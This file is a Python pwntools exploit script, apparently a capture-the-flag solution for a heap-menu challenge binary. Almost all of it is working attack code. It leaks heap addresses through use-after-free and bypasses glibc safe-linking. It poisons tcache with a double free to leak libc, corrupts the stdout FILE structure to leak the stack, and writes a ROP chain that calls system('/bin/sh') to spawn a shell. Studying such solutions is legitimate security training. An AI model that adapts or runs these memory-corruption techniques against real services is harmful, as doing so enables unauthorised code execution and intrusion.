#!/usr/bin/env python3
from pwn import *

name = './a.out_patched'
elf = context.binary = ELF(name)
libc = elf.libc
context.update(
    log_level='debug',
    terminal="wt.exe -w 0 sp -p kali-linux -- wsl --cd".split() + [os.getcwd()]
    # terminal = "wt.exe wsl -d kali-linux".split()
)

sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
s = lambda x: p.send(x)
rcall = lambda x: p.recvall(x)
rcu = lambda x, *args, **kwargs: p.recvuntil(x, *args, **{'drop': True, **kwargs})
rcl = lambda: p.recvline(0)
rcn = lambda x: p.recv(x)
libx = lambda x: libc.address + x
elx = lambda x: elf.address + x
logi = lambda x, y: log.info(f'{x} = {hex(y)}')
def bleak(x): ret = unpack(x, 'all'); logi('leak', ret); return ret
def hleak(x): ret = eval(x); logi('leak', ret); return ret

def start():
    global libc
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.DOCKER:
        pp = remote(HOST, PORT)
        pid = int(subprocess.run(f"pgrep -fx {name}", shell=True, capture_output=True, encoding="utf-8").stdout)
        script = f"""
        set sysroot /proc/{pid}/root
        b* main
        c
        """
        attach(pid, gdbscript=script, sysroot=f"/proc/{pid}/root", exe=name)
        return pp
    elif args.GDB:
        c = '''
        # b* main
        c
        '''
        return gdb.debug([elf.path], c)
    else:
        return elf.process()

REMOTE = ''.replace('nc ', '').split(' ')
HOST = REMOTE[0] if REMOTE else ''
PORT = int(REMOTE[1]) if len(REMOTE) > 1 else 0

p = start()

def add(idx, msg):
    sla(b': ', b'1')
    sla(b'i : ', str(idx).encode())
    sl(msg)

def free(idx):
    sla(b': ', b'3')
    sla(b'i : ', str(idx).encode())

def see(idx):
    sla(b': ', b'4')
    sla(b'i : ', str(idx).encode())

def xorr(idx):
    sla(b': ', b'2')
    sla(b'i : ', str(idx).encode())

def mangle(leak:int, target:int) -> int:
    return leak >> 12 ^ target

def demangle(addr:int) -> int:
    mid = addr >> 12 ^ addr
    ril = mid >> 24 ^ mid
    return ril


add(9, b'a')
add(8, b'a')
free(8)
free(9)
see(9)
heap = demangle(bleak(rcn(6)))
logi('heap', heap)

add(9, p64(0)+p64(0x451)+p64(mangle(heap, 0)))
for i in range(5):
    add(0, str(0).encode())

for i in range(9):
    add(i, str(i).encode())

for i in range(7):
    free(i)

free(7)
free(8)
free(7)

for i in range(7):
    add(i, b'TEST')

add(0, p64(mangle(heap, heap-0x40)))
add(1, b'test')
add(2, b'test')
add(3, b'target')

free(3)
see(3)

libc.address = bleak(rcn(6)) - 0x210b20
logi('libc', libc.address)

binsh = next(libc.search('/bin/sh\x00'))
rop = ROP(libc)
rop.raw(rop.find_gadget(["ret"]).address)
rop.system(binsh)

add(0, b'test')
add(1, b'test')

free(1)
free(0)
free(9)

add(9, p64(0)+p64(0x51)+p64(mangle(heap, libc.sym._IO_2_1_stdout_)))
add(0, b'test')

pl = flat({
    0: [
        0xfbad1800,
        libc.sym._IO_2_1_stdout_+131,
        libc.sym._IO_2_1_stdout_+131,
        libc.sym._IO_2_1_stdout_+131,
        libc.sym._IO_2_1_stdout_+131,
        libc.sym._IO_2_1_stdout_+131+0xa8-3,
    ]
})
add(1, pl)

stack = bleak(rcu(b'a - 1, b - 2')[-8:])

free(2)
free(0)
free(9)

add(9, p64(0)+p64(0x51)+p64(mangle(heap, stack-0x158)))
add(0, b'test')

# pause()

add(1, p64(stack)+rop.chain())

p.interactive()